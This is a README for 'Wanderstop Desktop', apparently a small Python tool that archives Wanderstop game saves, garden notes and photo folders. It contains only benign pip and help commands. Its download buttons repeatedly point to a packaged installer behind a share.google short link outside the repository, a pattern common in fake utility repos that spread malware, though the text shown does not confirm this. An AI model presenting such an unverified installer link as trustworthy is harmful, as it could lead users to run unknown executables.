![Wanderstop Desktop](assets/hero.png)

# Wanderstop Desktop

*Keep the tea shop on disk before a story chapter.*

## Overview

**Wanderstop Desktop** is a desktop utility. A local helper for Wanderstop tea-shop folders, garden notes, and forest photos.

Tea-shop cozy saves hide under Steam IDs.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Finds the Wanderstop folder.
- Archives shop and garden files.
- Lists forest photo albums.
- Prints a short keep report.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/zachhunt5782/wanderstop-desktop

MIT license. See `LICENSE`.
